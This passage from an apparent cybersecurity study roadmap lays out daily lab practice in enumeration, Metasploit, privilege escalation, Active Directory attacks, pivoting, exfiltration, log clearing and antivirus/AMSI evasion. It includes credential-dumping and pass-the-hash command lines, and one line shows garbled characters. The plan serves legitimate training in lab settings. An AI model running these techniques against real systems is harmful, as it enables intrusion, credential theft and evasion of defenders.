- **Practice**: `masscan -p1-65535 <target> --rate=10000`
- **Goal**: Efficient large-scale scanning

#### Day 2: Service Enumeration

- **Practice**: Identify services on open ports
- **Learn**: Banner grabbing with netcat, telnet
- **Tool**: Nmap NSE scripts for specific services
- **Practice**: Enumerate SMB shares (`enum4linux`, `smbclient`)
- **Goal**: Detailed service fingerprinting

#### Day 3: Web Directory Brute Forcing

- **Tool**: Gobuster, Dirbuster, ffuf
- **Practice**: `gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt`
- **Practice**: `ffuf -u http://target/FUZZ -w wordlist.txt`
- **Learn**: Choosing wordlists (small, medium, large)
- **Goal**: Discover hidden files and directories

#### Day 4: DNS Brute Forcing

- **Tool**: dnsrecon, dnsenum with wordlists
- **Practice**: Brute force subdomains
- **Practice**: Reverse lookup on IP ranges
- **Learn**: Creating custom wordlists for targets
- **Goal**: Comprehensive subdomain discovery

#### Day 5: Email Harvesting

- **Tool**: theHarvester, hunter.io
- **Practice**: Collect emails from company domain
- **Practice**: Verify email addresses (SMTP, web tools)
- **Learn**: Email format patterns (firstname.lastname@company.com)
- **Goal**: Build target email list

#### Weekend Project:

- Perform complete enumeration on TryHackMe boxes
- Document enumeration findings in standardized format
- Build custom wordlists for enumeration

---

### WEEK 3: Web Application Enumeration

#### Day 1: Technology Identification

- **Tool**: Wappalyzer (browser extension)
- **Tool**: WhatWeb, BuiltWith
- **Practice**: Identify CMS (WordPress, Joomla, Drupal)
- **Practice**: Detect web frameworks, libraries, servers
- **Goal**: Understand target technology stack

#### Day 2: WordPress Enumeration

- **Tool**: WPScan (`wpscan --url <target> --enumerate`)
- **Practice**: Find plugins, themes, users
- **Practice**: Identify vulnerable plugins
- **Complete**: TryHackMe "Blog" challenge
- **Goal**: Comprehensive WordPress reconnaissance

#### Day 3: API Enumeration

- **Learn**: REST API structures, common endpoints
- **Practice**: Discover API endpoints (/api/v1/, /api/users)
- **Tool**: Postman for API testing
- **Practice**: Test for API vulnerabilities (broken auth, excessive data exposure)
- **Goal**: API attack surface mapping

#### Day 4: SSL/TLS Analysis

- **Tool**: testssl.sh for SSL/TLS testing
- **Tool**: SSLyze for detailed analysis
- **Practice**: Identify weak ciphers, expired certificates
- **Practice**: Check for Heartbleed, POODLE vulnerabilities
- **Goal**: Certificate and encryption assessment

#### Day 5: Web Application Fingerprinting

- **Practice**: Identify WAF/IDS (Cloudflare, ModSecurity)
- **Tool**: wafw00f for WAF detection
- **Practice**: Error message analysis for information leakage
- **Practice**: Response header analysis
- **Goal**: Detailed web app profiling

#### Weekend Project:

- Enumerate 5 different web applications thoroughly
- Create standardized enumeration checklist
- Practice documenting findings professionally

---

### WEEK 4: Network & Infrastructure Enumeration

#### Day 1: SMB Enumeration

- **Tool**: enum4linux, smbclient, smbmap
- **Practice**: `enum4linux -a <target>`
- **Practice**: List shares, access permissions
- **Practice**: Enumerate users and groups
- **Goal**: Windows network reconnaissance

#### Day 2: SNMP Enumeration

- **Learn**: SNMP protocol, community strings
- **Tool**: snmpwalk, onesixtyone
- **Practice**: Enumerate devices via SNMP
- **Practice**: Extract system information, network config
- **Goal**: Network device reconnaissance

#### Day 3: LDAP Enumeration

- **Learn**: LDAP structure, common queries
- **Tool**: ldapsearch, ADExplorer
- **Practice**: Query Active Directory
- **Practice**: Extract user lists, groups, OUs
- **Goal**: Directory service enumeration

#### Day 4: VoIP Enumeration

- **Learn**: SIP protocol basics
- **Tool**: svmap, svwar (SIPVicious tools)
- **Practice**: Scan for SIP devices
- **Practice**: Enumerate VoIP extensions
- **Goal**: Telecommunications reconnaissance

#### Day 5: Month 5 Review

- **Complete**: TryHackMe "Recon" path
- **Review**: All enumeration techniques learned
- **Practice**: Full reconnaissance on HTB machine
- **Self-test**: Can you enumerate target from scratch?
- **Goal**: Comprehensive recon capabilities

#### Weekend Project:

- Perform complete reconnaissance and enumeration on complex network
- Build recon automation scripts
- Create professional enumeration report template

### Month 5 Completion Criteria:

✓ Can perform passive and active reconnaissance  
✓ Proficient in subdomain and directory enumeration  
✓ Can enumerate various services (SMB, SNMP, LDAP)  
✓ Understand OSINT techniques  
✓ Created enumeration automation tools

---

## MONTH 6: Exploitation Basics

### Objectives:

- Learn Metasploit framework
- Understand manual exploitation techniques
- Practice privilege escalation (Linux & Windows)
- Develop exploitation methodology

---

### WEEK 1: Metasploit Framework

#### Day 1: Metasploit Fundamentals

- **Watch**: "Metasploit for Beginners" by HackerSploit (full series)
- **Learn**: MSF architecture (modules, payloads, encoders)
- **Practice**: `msfconsole`, basic commands (search, use, show, set)
- **Complete**: TryHackMe "Metasploit" room
- **Goal**: Navigate Metasploit framework

#### Day 2: Exploits and Payloads

- **Learn**: Exploit vs payload vs auxiliary modules
- **Practice**: search exploits for specific service
- **Practice**: Configure LHOST, LPORT, RHOST, RPORT
- **Practice**: Generate payloads with msfvenom
- **Goal**: Understand MSF components

#### Day 3: Meterpreter Sessions

- **Learn**: Meterpreter vs standard shells
- **Practice**: Upgrade shell to Meterpreter
- **Practice**: Meterpreter commands (sysinfo, getuid, ps, migrate)
- **Practice**: File upload/download, screenshot, webcam_snap
- **Goal**: Post-exploitation with Meterpreter

#### Day 4: Metasploit Scanning

- **Learn**: Metasploit scanning modules
- **Practice**: Port scanning with Metasploit
- **Practice**: Service version detection
- **Practice**: Vulnerability scanning modules
- **Goal**: Reconnaissance within MSF

#### Day 5: Database Integration

- **Learn**: Metasploit database setup (PostgreSQL)
- **Practice**: Store scan results in database
- **Practice**: `db_nmap` for integrated scanning
- **Practice**: Manage workspaces, hosts, services
- **Goal**: Organized pentesting workflow

#### Weekend Project:

- Complete HTB machine using only Metasploit
- Document Metasploit usage methodology
- Build custom Metasploit resource scripts

---

### WEEK 2: Manual Exploitation

#### Day 1: Searchsploit & Exploit-DB

- **Tool**: searchsploit (offline Exploit-DB)
- **Practice**: `searchsploit <service> <version>`
- **Practice**: Download and read exploit code
- **Learn**: Modify exploits for specific targets
- **Goal**: Find and adapt public exploits

#### Day 2: Python Exploit Scripts

- **Learn**: Read and understand exploit PoCs
- **Practice**: Modify exploit parameters (IP, port)
- **Practice**: Debug failing exploits
- **Practice**: Add error handling, improve reliability
- **Goal**: Customize exploit scripts

#### Day 3: Buffer Overflow (Introduction)

- **Watch**: "Buffer Overflow Explained" by LiveOverflow
- **Learn**: Stack structure, EIP overwrite concept
- **Tool**: Immunity Debugger (on Windows VM)
- **Practice**: Crash application, find offset
- **Goal**: Basic buffer overflow understanding

#### Day 4: Buffer Overflow (Exploitation)

- **Practice**: Control EIP, find bad characters
- **Practice**: Generate shellcode with msfvenom
- **Practice**: Develop working exploit
- **Complete**: TryHackMe "Buffer Overflow Prep" room
- **Goal**: Exploit buffer overflow vulnerability

#### Day 5: Web Shell Upload

- **Practice**: Upload PHP, ASP, JSP shells
- **Resource**: PayloadsAllTheThings web shells
- **Practice**: Bypass upload restrictions
- **Practice**: Execute commands via web shell
- **Goal**: Gain initial access via file upload

#### Weekend Project:

- Exploit 3 vulnerable machines manually (no Metasploit)
- Write custom exploit for simple vulnerability
- Document manual exploitation process

---

### WEEK 3: Privilege Escalation - Linux

#### Day 1: Linux Enumeration for PrivEsc

- **Tool**: LinPEAS, LinEnum, linux-exploit-suggester
- **Practice**: Manual enumeration checklist
- **Check**: sudo -l, SUID binaries, cron jobs, writable files
- **Complete**: TryHackMe "Linux PrivEsc" room
- **Goal**: Identify privilege escalation vectors

#### Day 2: SUID/SGID Exploitation

- **Learn**: How SUID works, why it's dangerous
- **Practice**: Find SUID binaries (`find / -perm -4000 2>/dev/null`)
- **Resource**: GTFOBins for SUID exploits
- **Practice**: Exploit vulnerable SUID binaries
- **Goal**: Escalate via SUID

#### Day 3: Kernel Exploits

- **Learn**: Identifying kernel version vulnerabilities
- **Tool**: linux-exploit-suggester
- **Practice**: Compile and run kernel exploits
- **Caution**: Kernel exploits can crash systems
- **Goal**: Understand kernel exploitation

#### Day 4: Cron Job Abuse

- **Learn**: Analyze cron jobs for privesc
- **Practice**: Modify cron scripts, add malicious code
- **Practice**: PATH hijacking in cron jobs
- **Practice**: Wildcard injection in cron
- **Goal**: Escalate via scheduled tasks

#### Day 5: Capability & Container Escapes

- **Learn**: Linux capabilities, Docker privilege escalation
- **Practice**: Exploit dangerous capabilities
- **Practice**: Docker socket exploitation
- **Complete**: TryHackMe "Linux PrivEsc Arena"
- **Goal**: Advanced Linux privesc

#### Weekend Project:

- Escalate privileges on 10 different Linux machines
- Create Linux privesc checklist and automation script
- Document all techniques used

---

### WEEK 4: Privilege Escalation - Windows

#### Day 1: Windows Enumeration for PrivEsc

- **Tool**: WinPEAS, PowerUp, Sherlock
- **Practice**: `whoami /priv`, check SeImpersonate
- **Practice**: Check unquoted service paths
- **Complete**: TryHackMe "Windows PrivEsc" room
- **Goal**: Identify Windows privesc vectors

#### Day 2: Service Exploitation

- **Learn**: Windows service vulnerabilities
- **Practice**: Unquoted service path exploitation
- **Practice**: Weak service permissions
- **Practice**: Service binary hijacking
- **Goal**: Escalate via services

#### Day 3: Token Impersonation

- **Learn**: Windows access tokens, SeImpersonate privilege
- **Tool**: Juicy Potato, PrintSpoofer
- **Practice**: Escalate from service account to SYSTEM
- **Practice**: Token manipulation techniques
- **Goal**: Abuse token privileges

#### Day 4: Registry & Scheduled Tasks

- **Learn**: AlwaysInstallElevated, AutoRun keys
- **Practice**: Registry exploitation for privesc
- **Practice**: Scheduled task hijacking
- **Practice**: DLL hijacking
- **Goal**: Multiple Windows privesc methods

#### Day 5: Month 6 Review & Decision Point

- **Complete**: TryHackMe "Windows PrivEsc Arena"
- **Review**: All exploitation techniques learned
- **Self-test**: Can you exploit and escalate on both Linux and Windows?
- **Decision**: Choose specialization for Month 10 (Offensive, Defensive, Cloud, AppSec)
- **Goal**: Strong exploitation foundation

#### Weekend Project:

- Root 5 Windows machines using different techniques
- Root 5 Linux machines using different techniques
- Write exploitation methodology document

### Month 6 Completion Criteria:

✓ Proficient in Metasploit framework  
✓ Can exploit vulnerabilities manually  
✓ Master Linux privilege escalation  
✓ Master Windows privilege escalation  
✓ Completed 20+ vulnerable machines

---

# PHASE 3: PRACTICAL APPLICATION (Months 7-9)

---

## MONTH 7: Active Directory Attacks

### Objectives:

- Understand Active Directory architecture
- Learn Kerberos and NTLM authentication attacks
- Master lateral movement techniques
- Use BloodHound for AD enumeration

---

### WEEK 1: Active Directory Fundamentals

#### Day 1: AD Architecture

- **Watch**: "Active Directory Basics" by John Hammond
- **Learn**: Domain Controllers, forests, trees, trusts
- **Learn**: Users, groups, OUs, GPOs
- **Setup**: Windows Server AD lab (evaluation copy)
- **Goal**: Understand AD structure

#### Day 2: AD Enumeration with PowerShell

- **Learn**: PowerView, ADModule commands
- **Practice**: `Get-ADUser`, `Get-ADComputer`, `Get-ADGroup`
- **Practice**: Enumerate domain users, admins, computers
- **Practice**: Find service accounts, descriptions with passwords
- **Goal**: PowerShell AD reconnaissance

#### Day 3: BloodHound

- **Tool**: BloodHound, SharpHound collector
- **Practice**: Run SharpHound.exe to collect AD data
- **Practice**: Import data into BloodHound
- **Practice**: Find attack paths to Domain Admins
- **Goal**: Visualize AD attack surface

#### Day 4: LLMNR/NBT-NS Poisoning

- **Tool**: Responder
- **Learn**: How LLMNR/NBT-NS work, why they're vulnerable
- **Practice**: `responder -I eth0 -wv`
- **Practice**: Capture NTLMv2 hashes, crack with hashcat
- **Goal**: Passive credential harvesting

#### Day 5: SMB Relay Attacks

- **Tool**: ntlmrelayx (Impacket)
- **Learn**: SMB signing, when relay is possible
- **Practice**: Relay NTLM authentication to targets
- **Practice**: Gain code execution via relay
- **Goal**: Exploit NTLM authentication

#### Weekend Project:

- Complete TryHackMe "Active Directory Basics" room
- Build Active Directory home lab
- Enumerate AD from Linux and Windows

---

### WEEK 2: Kerberos Attacks

#### Day 1: Kerberos Fundamentals

- **Learn**: TGT, TGS, Kerberos authentication flow
- **Watch**: "Kerberos Explained" by Computerphile
- **Learn**: KDC, AS-REQ, AS-REP, TGS-REQ, TGS-REP
- **Understand**: Why Kerberos is complex and powerful
- **Goal**: Understand Kerberos protocol

#### Day 2: Kerberoasting

- **Learn**: Service Principal Names (SPNs)
- **Tool**: GetUserSPNs.py (Impacket), Rubeus
- **Practice**: Request TGS tickets for service accounts
- **Practice**: Extract and crack tickets offline
- **Goal**: Harvest service account credentials

#### Day 3: AS-REP Roasting

- **Learn**: Pre-authentication, accounts without it
- **Tool**: GetNPUsers.py (Impacket)
- **Practice**: Find users with "Do not require Kerberos preauthentication"
- **Practice**: Request AS-REP, crack offline
- **Goal**: Exploit misconfigured accounts

#### Day 4: Pass-the-Hash

- **Learn**: NTLM hash usage without cracking
- **Tool**: pth-winexe, psexec.py, evil-winrm
- **Practice**: Use NTLM hash to authenticate
- **Practice**: `evil-winrm -i <IP> -u <user> -H <hash>`
- **Goal**: Lateral movement without passwords

#### Day 5: Pass-the-Ticket & Golden Tickets

- **Learn**: Ticket manipulation, forged tickets
- **Tool**: Mimikatz, Rubeus
- **Practice**: Extract tickets from memory
- **Practice**: Create Golden Ticket (requires krbtgt hash)
- **Goal**: Advanced Kerberos attacks

#### Weekend Project:

- Complete TryHackMe "Attacking Kerberos" room
- Practice all Kerberos attacks in lab
- Document attack paths and techniques

---

### WEEK 3: Lateral Movement & Persistence

#### Day 1: Windows Remote Management

- **Learn**: PsExec, WinRM, WMI, RDP, DCOM
- **Tool**: Impacket suite (psexec.py, wmiexec.py, smbexec.py)
- **Practice**: Execute commands remotely using each method
- **Practice**: Compare stealth and detection levels
- **Goal**: Multiple lateral movement techniques

#### Day 2: Credential Dumping

- **Tool**: Mimikatz, pypykatz, lsassy
- **Learn**: LSASS memory, SAM database, NTDS.dit
- **Practice**: `mimikatz # sekurlsa::logonpasswords`
- **Practice**: Dump domain credentials from DC
- **Goal**: Extract credentials from memory

#### Day 3: Persistence Mechanisms

- **Learn**: Registry Run keys, scheduled tasks, services
- **Learn**: Golden Ticket, Silver Ticket for persistence
- **Practice**: Create scheduled task for persistence
- **Practice**: Backdoor startup items
- **Goal**: Maintain access to compromised systems

#### Day 4: Pivoting and Tunneling

- **Learn**: SSH tunneling, Chisel, ligolo
- **Practice**: Access internal network from compromised host
- **Practice**: Port forwarding, SOCKS proxy setup
- **Practice**: Pivot through multiple hosts
- **Goal**: Network traversal skills

#### Day 5: Domain Dominance

- **Learn**: DCSync attack, DCShadow
- **Tool**: Mimikatz DCSync
- **Practice**: Replicate password hashes from DC
- **Practice**: Extract entire domain database
- **Goal**: Full domain compromise

#### Weekend Project:

- Complete TryHackMe "Lateral Movement and Pivoting" room
- Compromise entire AD domain in lab
- Write AD penetration testing report

---

### WEEK 4: Defense Evasion & Month 7 Review

#### Day 1: AV/EDR Evasion Basics

- **Learn**: How antivirus works (signatures, heuristics, behavior)
- **Practice**: Obfuscate PowerShell scripts
- **Tool**: Invoke-Obfuscation
- **Practice**: Encode payloads, modify known malware
- **Goal**: Bypass basic defenses

#### Day 2: AMSI Bypass

- **Learn**: Antimalware Scan Interface (AMSI)
- **Practice**: AMSI bypass techniques
- **Practice**: Execute scripts without AMSI detection
- **Tool**: AMSITrigger to identify detections
- **Goal**: Bypass Windows script scanning

#### Day 3: AppLocker & WDAC Bypass

- **Learn**: Application whitelisting bypass techniques
- **Resource**: LOLBAS (Living Off The Land Binaries)
- **Practice**: Use trusted binaries for code execution
- **Practice**: DLL hijacking, proxy execution
- **Goal**: Execute code in restricted environments

#### Day 4: Credential Guard & Protected Processes

- **Learn**: Windows security features
- **Learn**: Limitations of credential dumping on modern Windows
- **Practice**: Alternative credential harvesting methods
- **Understand**: When techniques fail and why
- **Goal**: Adapt to security controls

#### Day 5: Month 7 Review

- **Complete**: TryHackMe "Hacking Active Directory" path
- **Complete**: HTB "Active" machine
- **Review**: All AD attack techniques
- **Self-test**: Can you compromise AD from zero to Domain Admin?
- **Goal**: AD penetration testing mastery

#### Weekend Project:

- Set up complex AD lab with multiple domains
- Perform full AD pentest from external to DA
- Write professional AD assessment report

### Month 7 Completion Criteria:

✓ Understand Active Directory architecture thoroughly  
✓ Can perform Kerberos attacks (Kerberoasting, AS-REP Roasting)  
✓ Proficient in lateral movement techniques  
✓ Can use BloodHound for attack path analysis  
✓ Compromised complete AD environment

---

## MONTH 8: CTF Intensive Training

### Objectives:

- Complete 30+ vulnerable machines
- Develop consistent penetration testing methodology
- Write detailed CTF write-ups
- Prepare for OSCP-level challenges

---

### WEEK 1: TryHackMe Machine Marathon

#### Days 1-7: Complete 10 TryHackMe Machines

**Strategy**: Pick machines progressively - 3 Easy, 4 Medium, 3 Hard

**Daily Routine**:

- **Morning (2 hours)**: Start new machine, reconnaissance & enumeration
- **Afternoon (2 hours)**: Exploitation and user flag
- **Evening (1 hour)**: Privilege escalation and root flag
- **Night (1 hour)**: Write detailed write-up

**Recommended Machines** (in order):

1. Blue (Easy - Windows, EternalBlue)
2. Kenobi (Easy - Linux, SUID)
3. Steel Mountain (Easy - Windows, RCE)
4. Alfred (Medium - Windows, Jenkins)
5. Internal (Medium - Linux, Web + Privesc)
6. Relevant (Medium - Windows, SMB)
7. GameZone (Medium - Linux, SQLi)
8. Vulnversity (Easy - Linux, File Upload)
9. Overpass (Medium - Linux, Cron)
10. Skynet (Medium - Linux, RFI)

**Requirements for each machine**:

- Document all reconnaissance findings
- Screenshot every step
- Write Markdown write-up explaining methodology
- Note what worked, what didn't, lessons learned

**Weekend Project**:

- Review all 10 write-ups
- Identify common patterns
- Create personal methodology checklist
- Upload write-ups to GitHub

---

### WEEK 2: HackTheBox Easy Machines

#### Days 1-7: Complete 10 HTB Easy Machines

**Note**: HTB machines are retired monthly; pick currently active Easy boxes or retired ones with write-up access.

**Daily Workflow**:

1. Full port scan (all 65535 ports)
2. Service enumeration and version detection
3. Web application testing (if applicable)
4. Find initial foothold
5. Enumerate target for privesc
6. Escalate to root/administrator
7. Document and write up

**General HTB Easy Machine Strategy**:

- Always start with comprehensive nmap scan
- Enumerate web directories thoroughly if HTTP/HTTPS present
- Check for default credentials
- Search for public exploits for identified services
- Run LinPEAS/WinPEAS after initial access
- Try common privesc vectors (SUID, sudo, services, scheduled tasks)

**Skills to Practice This Week**:

- Speed (try to complete Easy boxes in <4 hours)
- Note-taking efficiency
- Recognizing patterns from previous boxes
- Using searchsploit effectively

**Weekend Project**:

- Complete 2 additional boxes for bonus practice
- Compare your methodology with IppSec walkthroughs (watch AFTER completing)
- Refine personal methodology based on gaps

---

### WEEK 3: Medium Difficulty Challenges

#### Days 1-7: Complete 5 Medium Machines + Advanced Topics

**Medium Box Strategy** (these take longer):

- Days 1-2: Machine 1
- Days 3-4: Machine 2
- Day 5-6: Machine 3-4
- Day 7: Machine 5 + Review

**Recommended Medium Boxes**:

1. TryHackMe "Daily Bugle" (Joomla, SQLi, sudo)
2. HTB "Knife" (PHP backdoor, knife binary)
3. TryHackMe "Attacktive Directory" (AD attacks)
4. HTB "Exploration" (API, SSH)
5. TryHackMe "Anonymous" (FTP, SUID)

**Additional Daily Practice**:

- 1 hour: PicoCTF challenges (focused topic: cryptography, web, binary)
- 30 minutes: PortSwigger Web Security Academy lab

**Focus Areas**:

- Chaining multiple vulnerabilities
- Complex privilege escalation paths
- Advanced web application attacks
- Real-world-like scenarios

**Weekend Project**:

- Review all Medium boxes completed
- Analyze what makes them harder than Easy boxes
- Practice writing professional pentest findings
- Build personal exploit/notes database

---

### WEEK 4: OSCP-Style Practice & Month Review

#### Days 1-3: Proving Grounds Practice (OSCP Prep)

**Proving Grounds Practice Boxes** (similar to OSCP):

- 3 boxes over 3 days (1 per day)
- Simulate exam conditions: time limits, no hints
- Full enumeration, exploitation, reporting

**Recommended**:

- "Hutch" (Windows AD)
- "Snookums" (Linux Web)
- "Twiggy" (Linux Privesc)

#### Days 4-5: Custom Lab Challenges

**Build Your Own Challenges**:

- Set up intentionally vulnerable VMs
- Practice common scenarios (web apps, network services, AD)
- Test different attack paths
- Time yourself

#### Day 6: Month 8 Review

**Review Activities**:

- **Morning**: Review all 30+ write-ups
- **Afternoon**: Analyze success rate, common mistakes
- **Evening**: Update methodology and checklists

**Statistics to Track**:

- Total machines completed: _____
- Average time per Easy box: _____
- Average time per Medium box: _____
- Most difficult vulnerability to exploit: _____
- Most difficult privesc: _____
- Favorite tools: _____

#### Day 7: Methodology Refinement

**Create Master Checklist**:

1. **Reconnaissance Phase** (what to do, what tools)
2. **Enumeration Phase** (service-specific enumeration)
3. **Exploitation Phase** (common vulnerabilities to test)
4. **Post-Exploitation** (what to check, where to look)
5. **Privilege Escalation** (Linux and Windows checklists)
6. **Documentation** (what to screenshot, how to write up)

**Weekend Project**:

- Complete additional 3 boxes for practice
- Teach someone else your methodology (write blog post)
- Prepare for Month 9 advanced topics

### Month 8 Completion Criteria:

✓ Completed 30+ vulnerable machines (varied difficulty)  
✓ Written detailed write-ups for all boxes  
✓ Developed consistent penetration testing methodology  
✓ Can root Easy boxes in <4 hours  
✓ Confident in exploitation and privilege escalation

---

## MONTH 9: Advanced Topics & Home Lab Building

### Objectives:

- Learn buffer overflow exploitation in depth
- Master advanced pivoting and post-exploitation
- Build comprehensive home penetration testing lab
- Prepare for specialization choice

---

### WEEK 1: Buffer Overflow Mastery

#### Day 1: Stack-Based Buffer Overflow Theory

- **Watch**: LiveOverflow's "Binary Exploitation" playlist (videos 1-5)
- **Learn**: Stack structure, EIP, ESP, EBP registers
- **Learn**: Shellcode, NOPs, bad characters
- **Read**: "Smashing The Stack For Fun And Profit" article
- **Goal**: Deep understanding of memory exploitation

#### Day 2: Fuzzing and Crash Analysis

- **Tool**: Immunity Debugger, mona.py
- **Practice**: Fuzz vulnerable application (Vulnserver)
- **Practice**: Identify crash, control EIP
- **Practice**: Find offset using pattern_create/pattern_offset
- **Goal**: Crash analysis workflow

#### Day 3: Shellcode Development

- **Practice**: Generate shellcode with msfvenom
- **Practice**: Identify bad characters (�, , )
- **Practice**: Remove bad characters from shellcode
- **Practice**: Use NOP sled for reliability
- **Goal**: Working shellcode injection

#### Day 4: Exploit Development

- **Practice**: Find JMP ESP address
- **Practice**: Develop complete exploit script
- **Practice**: Bypass ASLR (Address Space Layout Randomization)
- **Practice**: DEP bypass techniques (ROP chains basics)
- **Goal**: Full exploit from crash to shell

#### Day 5: Multiple Buffer Overflow Practice

- **Complete**: TryHackMe "Buffer Overflow Prep" (all 10 tasks)
- **Practice**: Overflow different applications
- **Practice**: Write exploits from scratch
- **Document**: Exploit development process
- **Goal**: Consistent buffer overflow exploitation

#### Weekend Project:

- Exploit 3 different vulnerable applications
- Write detailed buffer overflow exploitation guide
- Practice for OSCP-style buffer overflow

---

### WEEK 2: Advanced Pivoting and Post-Exploitation

#### Day 1: Advanced Pivoting Techniques

- **Tool**: Chisel, ligolo-ng, sshuttle
- **Learn**: Double pivoting, multi-hop scenarios
- **Practice**: Access 3-tier network through compromised hosts
- **Practice**: Dynamic port forwarding with SSH
- **Goal**: Complex network navigation

#### Day 2: Tunneling Protocols

- **Learn**: SSH tunneling (-L, -R, -D)
- **Learn**: Meterpreter routing and portfwd
- **Tool**: socat for port forwarding
- **Practice**: Create persistent tunnels
- **Goal**: Multiple tunneling methods

#### Day 3: Post-Exploitation Framework

- **Tool**: Empire, Covenant C2 frameworks
- **Practice**: Set up C2 infrastructure
- **Practice**: Agent deployment and management
- **Practice**: Evasion techniques
- **Goal**: Professional C2 usage

#### Day 4: Data Exfiltration

- **Learn**: Exfiltration techniques (DNS, ICMP, HTTP)
- **Practice**: Exfiltrate data without triggering alarms
- **Tool**: dnscat2 for DNS tunneling
- **Practice**: Stealth data transfer methods
- **Goal**: Covert data extraction

#### Day 5: Covering Tracks

- **Learn**: Log manipulation, timestomping
- **Practice**: Clear event logs, bash history
- **Practice**: Remove artifacts, IOCs
- **Understand**: Attribution and forensics
- **Goal**: Operational security

#### Weekend Project**:

- Set up multi-subnet penetration testing lab
- Practice full attack chain with pivoting
- Document advanced techniques

---

### WEEK 3: Home Lab Engineering

#### Day 1: Lab Design and Planning

- **Design**: Network architecture (subnets, VLANs)
- **Plan**: Systems to include (DC, web server, database, workstations)
- **Plan**: Attack scenarios to practice
- **Resource**: Download ISOs (Windows Server, various Linux, pfSense)
- **Goal**: Comprehensive lab blueprint

#### Day 2: Network Infrastructure

- **Setup**: pfSense firewall/router VM
- **Configure**: Multiple network segments
- **Setup**: DNS, DHCP services
- **Practice**: Network isolation and routing
- **Goal**: Production-like network

#### Day 3: Active Directory Domain

- **Setup**: Windows Server as Domain Controller
- **Configure**: AD DS, create forest and domain
- **Add**: User accounts, groups, OUs
- **Join**: Windows 10 clients to domain
- **Goal**: Realistic AD environment

#### Day 4: Vulnerable Applications

- **Deploy**: Intentionally vulnerable web apps (DVWA, Mutillidae)
- **Setup**: Vulnerable network services (FTP, SMB, SSH with weak configs)
- **Configure**: Metasploitable VMs
- **Add**: Capture The Flag challenges
- **Goal**: Diverse attack surface

#### Day 5: Monitoring and Logging

- **Setup**: Splunk or ELK stack for logging
- **Configure**: Windows Event Forwarding
- **Setup**: Syslog server for network devices
- **Practice**: Query logs, create alerts
- **Goal**: Blue team perspective

#### Weekend Project**:

- Complete lab buildout
- Test all systems and connectivity
- Create lab documentation and diagrams
- Snapshot all VMs in clean state

---

### WEEK 4: Specialization Preparation & Month Review

#### Day 1: Offensive Security Track

- **Research**: Offensive roles (pentester, red teamer, exploit developer)
- **Learn**: Career paths, required skills, certifications
- **Practice**: Advanced exploitation on lab
- **Resource**: Read "The Hacker Playbook" (offense chapters)
- **Goal**: Understand offensive career path

#### Day 2: Defensive Security Track

- **Research**: Defensive roles (SOC analyst, incident responder, threat hunter)
- **Learn**: Blue team tools (SIEM, IDS/IPS, forensics)
- **Practice**: Detect attacks in your lab logs
- **Resource**: Read "Blue Team Handbook"
- **Goal**: Understand defensive career path

#### Day 3: Cloud Security Track

- **Research**: Cloud security roles (cloud pentester, cloud architect)
- **Learn**: AWS/Azure/GCP security concepts
- **Practice**: Create free tier cloud account, explore
- **Resource**: Read "Cloud Security Fundamentals"
- **Goal**: Understand cloud security path

#### Day 4: Application Security Track

- **Research**: AppSec roles (security engineer, code reviewer)
- **Learn**: SAST, DAST, secure coding
- **Practice**: Code review for vulnerabilities
- **Resource**: Explore OWASP guides
- **Goal**: Understand AppSec career path

#### Day 5: Month 9 Review & Decision

- **Review**: All advanced topics covered
- **Complete**: 5 additional boxes to stay sharp
- **Self-test**: Can you exploit buffer overflow? Pivot through networks? Build labs?
- **Decision**: Choose specialization for Month 10
- **Goal**: Ready for specialization

#### Weekend Project**:

- Make final decision on specialization path
- Research Month 10-12 plan for chosen track
- Update resume and LinkedIn with new skills
- Plan certification path if applicable

### Month 9 Completion Criteria:

✓ Can exploit buffer overflows consistently  
✓ Master advanced pivoting and post-exploitation  
✓ Built comprehensive home penetration testing lab  
✓ Decided on specialization track  
✓ Ready for focused advanced training

---

# PHASE 4: SPECIALIZATION & JOB PREPARATION (Months 10-12)

## MONTH 10: Specialization Path

_Note: Choose ONE path based on your interest and Month 9 decision_

---

### PATH A: OFFENSIVE SECURITY (Red Team/Pentesting)

#### WEEK 1: Advanced Web Application Testing

- Complete PortSwigger Web Security Academy (all topics)
- Practice on HackTheBox Pro Labs (web-focused)
- Learn advanced XXE, SSRF, deserialization attacks
- Master OWASP Testing Guide
- Complete 5 web-focused CTF challenges

#### WEEK 2: Network Penetration Testing

- Internal network penetration testing methodology
- Practice on enterprise network simulations
- Learn C2 frameworks (Cobalt Strike alternatives)
- Master Impacket toolset
- Complete CRTP-style labs

#### WEEK 3: Red Team Operations

- Learn red team vs pentest differences
- Practice adversary emulation (MITRE ATT&CK)
- Develop custom tools and payloads
- Practice long-term persistence
- Complete red team scenarios

#### WEEK 4: Exploit Development

- Advanced buffer overflow (SEH, ASLR, DEP)
- Intro to ROP chains
- Fuzzing with AFL, Boofuzz
- Write custom exploits
- CVE research and analysis

---

### PATH B: DEFENSIVE SECURITY (Blue Team/SOC)

#### WEEK 1: SIEM and Log Analysis

- Deploy Splunk/ELK stack
- Learn SPL (Search Processing Language)
- Create detection rules
- Practice threat hunting
- Analyze attack logs from Month 8 CTFs

#### WEEK 2: Incident Response

- NIST IR framework (Preparation, Detection, Containment, Eradication, Recovery)
- Malware analysis basics (static and dynamic)
- Memory forensics with Volatility
- Network forensics with Wireshark
- Complete IR scenarios

#### WEEK 3: Threat Intelligence

- MITRE ATT&CK framework
- Threat hunting methodologies
- OSINT for threat intel
- IOC creation and sharing
- Practice tracking APT groups

#### WEEK 4: Security Monitoring

- Deploy IDS/IPS (Suricata, Snort)
- Create detection signatures
- EDR solutions (hands-on)
- Alert triage and analysis
- Build SOC automation

---

### PATH C: CLOUD SECURITY

#### WEEK 1: AWS Security

- IAM deep dive (roles, policies, SCPs)
- S3 bucket security, CloudTrail logging
- VPC security (security groups, NACLs)
- Lambda security, serverless attacks
- Complete AWS security labs

#### WEEK 2: Azure Security

- Azure AD, Conditional Access
- Azure Security Center
- Network security in Azure
- Azure Key Vault, managed identities
- Practice Azure pentesting

#### WEEK 3: Cloud Penetration Testing

- Cloud-specific attack vectors
- Metadata service exploitation
- Cloud storage enumeration
- Container security (Docker, Kubernetes)
- Complete cloud CTF challenges

#### WEEK 4: Cloud Security Architecture

- Shared responsibility model
- Cloud compliance frameworks
- Infrastructure as Code security
- Cloud SIEM and monitoring
- Multi-cloud security

---

### PATH D: APPLICATION SECURITY

#### WEEK 1: Secure Code Review

- SAST tools (SonarQube, Checkmarx)
- Manual code review techniques
- Common coding vulnerabilities
- Secure coding standards
- Review vulnerable code samples

#### WEEK 2: API Security

- REST API security testing
- GraphQL security
- API authentication/authorization
